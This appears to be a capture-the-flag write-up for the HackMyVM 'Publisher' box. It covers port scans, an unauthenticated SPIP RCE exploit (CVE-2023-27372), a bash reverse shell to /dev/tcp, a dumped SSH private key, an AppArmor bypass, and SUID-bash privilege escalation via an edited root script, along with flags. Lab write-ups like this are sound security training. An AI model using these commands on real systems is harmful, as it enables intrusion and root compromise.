# Publisher

## Recon

::: details nmap_scan.log.md
```log
Open ports, closed hearts.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.93:22
Open 10.0.2.93:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.93
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

No outgoing links..

![writeup.png](/assets/pentest/hackmyvm/publisher/writeup.png)

```bash
‚îî‚îÄ$ feroxbuster -u http://10.0.2.93 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
301      GET        9l       28w      307c http://10.0.2.93/images => http://10.0.2.93/images/
200      GET      150l      766w     8686c http://10.0.2.93/index.html
200      GET      150l      766w     8686c http://10.0.2.93/
301      GET        9l       28w      305c http://10.0.2.93/spip => http://10.0.2.93/spip/
```

![writeup-1.png](/assets/pentest/hackmyvm/publisher/writeup-1.png)

### RCE

```bash
‚îî‚îÄ$ searchsploit 'spip 4.2.0'
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                  | php/webapps/51536.py
----------------------------------------------------------------------- ---------------------------------

‚îî‚îÄ$ searchsploit -m php/webapps/51536.py
  Exploit: SPIP v4.2.0 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/51536
     Path: /usr/share/exploitdb/exploits/php/webapps/51536.py
    Codes: CVE-2023-27372
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/woyag/Desktop/Rooms/HackMyVM/Publisher/51536.py

# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled.
# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter
#  and allows an unauthenticated user to execute arbitrary commands with web user privileges.
```

### Reverse Shell

The commands are probably executed, but not seen. If we use reverse shell code we can catch the shell.
```bash
‚îî‚îÄ$ py 51536.py -u http://10.0.2.93/spip/ -c id -v
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";

‚îî‚îÄ$ py 51536.py -u http://10.0.2.93/spip/ -c '/bin/bash -c "/bin/bash -i >&/dev/tcp/10.0.2.15/4444 0>&1"' -v
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
---
‚îî‚îÄ$ pwncat-cs -lp 4444
[05:04:41] Welcome to pwncat üêà!                               
[05:05:21] received connection from 10.0.2.93:49332           
[05:05:22] 10.0.2.93:49332: registered new host w/ db        
(remote) www-data@41c976e507f8:/home/think/spip/spip$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## SSH

```bash
(remote) www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
‚îî‚îÄ$ nano id_rsa.think
‚îî‚îÄ$ chmod 600 id_rsa.think
‚îî‚îÄ$ ssh -i id_rsa.think think@10.0.2.93
think@publisher:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

### User.txt

```bash
think@publisher:~$ cat user.txt
fa229046d44eda6a3598c73ad96f4ca5
```

## Privilege Escalation

There's unusual binary called `run_container`, but we can't execute it even tho we have permissions. Something is denying us.
```bash
think@publisher:/$ find . -perm -4000 -ls 2>/dev/null
     3279     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 ./usr/lib/policykit-1/polkit-agent-helper-1
    18535    468 -rwsr-xr-x   1 root     root       477672 Dec 18  2023 ./usr/lib/openssh/ssh-keysign
     1383     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 ./usr/lib/eject/dmcrypt-get-device
     9110     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 ./usr/lib/dbus-1.0/dbus-daemon-launch-helper
     7253     16 -rwsr-sr-x   1 root     root          14488 Dec 13  2023 ./usr/lib/xorg/Xorg.wrap
    78918    388 -rwsr-xr--   1 root     dip          395144 Jul 23  2020 ./usr/sbin/pppd
   524324     20 -rwsr-sr-x   1 root     root          16760 Nov 14  2023 ./usr/sbin/run_container
      491     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 ./usr/bin/at
      672     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 ./usr/bin/fusermount
      480     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 ./usr/bin/gpasswd
      178     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 ./usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 ./usr/bin/sudo
      184     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 ./usr/bin/chsh
      547     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 ./usr/bin/passwd
     9965     56 -rwsr-xr-x   1 root     root          55528 May 30  2023 ./usr/bin/mount
    14014     68 -rwsr-xr-x   1 root     root          67816 May 30  2023 ./usr/bin/su
     1235     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 ./usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 ./usr/bin/pkexec
     9972     40 -rwsr-xr-x   1 root     root          39144 May 30  2023 ./usr/bin/umount
think@publisher:/$ file /usr/sbin/run_container
./usr/sbin/run_container: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=de92d7f1ac0088bfa52908d5945bfb4fd8fd390e, for GNU/Linux 3.2.0, not stripped
think@publisher:/$ /usr/sbin/run_container
/bin/bash: /opt/run_container.sh: Permission denied
think@publisher:/etc/apparmor.d$ ls -l /opt -d
drwxr-xr-x 3 root root 4096 Mar 29  2024 /opt
```

Linpeas shows that AppArmor is on
```bash
think@publisher:~$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee /tmp/lp.log
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Protections
‚ïê‚ï£ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
‚ïê‚ï£ AppArmor profile? .............. /usr/sbin/ash (complain)
‚ïê‚ï£ is linuxONE? ................... s390x Not Found
‚ïê‚ï£ grsecurity present? ............ grsecurity Not Found
‚ïê‚ï£ PaX bins present? .............. PaX Not Found
‚ïê‚ï£ Execshield enabled? ............ Execshield Not Found
‚ïê‚ï£ SELinux enabled? ............... sestatus Not Found
‚ïê‚ï£ Seccomp enabled? ............... disabled
‚ïê‚ï£ User namespace? ................ enabled
‚ïê‚ï£ Cgroup2 enabled? ............... enabled
‚ïê‚ï£ Is ASLR enabled? ............... Yes
‚ïê‚ï£ Printer? ....................... No
‚ïê‚ï£ Is this a virtual machine? ..... Yes (oracle)
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Container related tools present (if any):
/usr/bin/docker
/usr/sbin/runc
/usr/bin/ctr
/usr/bin/containerd
/usr/bin/docker-compose
/usr/bin/docker-proxy
/usr/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Processes with unusual configurations
Process 1201 (root) - /bin/sh /usr/sbin/apache2ctl -D FOREGROUND
SELinux context: docker-default (enforce)\n  ‚îî‚îÄ AppArmor profile: docker-default (enforce)
...
Process 2098 (think) - bash
SELinux context: /usr/sbin/ash (complain)\n  ‚îî‚îÄ AppArmor profile: /usr/sbin/ash (complain)

Process 2099 (think) - tee /tmp/lp.log
SELinux context: /usr/sbin/ash (complain)\n  ‚îî‚îÄ AppArmor profile: /usr/sbin/ash (complain)
...
‚ïê‚ïê‚ï£ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
pkexec version 0.105
Vulnerable to CVE-2021-3560 # Orange, but probably not intended
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient
-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root   460 Feb 10  2024 usr.sbin.ash
-rw-r--r-- 1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r-- 1 root root  2006 Jun 14  2023 usr.sbin.mysqld
-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1482 Feb 10  2023 usr.sbin.tcpdump
```

```bash
think@publisher:/etc/apparmor.d$ cat usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** rwx,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rwix,
}
```

Bypass was easier then expected
```bash
think@publisher:/etc/apparmor.d$ cp /bin/bash /tmp/bash
think@publisher:/etc/apparmor.d$ /tmp/bash -p
think@publisher:/etc/apparmor.d$ ls /opt
containerd  dockerfile  run_container.sh
```

```bash
think@publisher:/opt$ nano run_container.sh
#!/bin/bash
install -m 4777 /tmp/bash /tmp/rootbash # Inserted
# Function to list Docker containers
...
```

Execute binary using SUID bit and get root bash
```bash
think@publisher:/opt$ /usr/sbin/run_container
List of Docker containers:
ID: e15f8d6d283d | Name: quirky_bohr | Status: Created
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up Less than a second

Enter the ID of the container or leave blank to create a new one: ^C
think@publisher:/opt$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) groups=1000(think)
```

### Root.txt

```bash
rootbash-5.0# cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca
```

## P.S.

Interesting technique used here: [https://vishal-chandak.medium.com/hackmyvm-publisher-4a5033fce95d](https://vishal-chandak.medium.com/hackmyvm-publisher-4a5033fce95d)
- [What is /lib64/ld-linux-x86-64.so.2 and why can it be used to execute file?](https://unix.stackexchange.com/questions/400621/what-is-lib64-ld-linux-x86-64-so-2-and-why-can-it-be-used-to-execute-file)
- "I run this command `/lib64/ld-linux-x86‚Äì64.so.2 /bin/bash` and now I am able to `cat` the `/opt/run_container.sh` script."

```bash
think@publisher:/opt$ ldd /usr/sbin/ash
        linux-vdso.so.1 (0x00007ffc24394000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f57f1a84000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f57f1a7e000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f57f188c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f57f1bf0000) # <---
```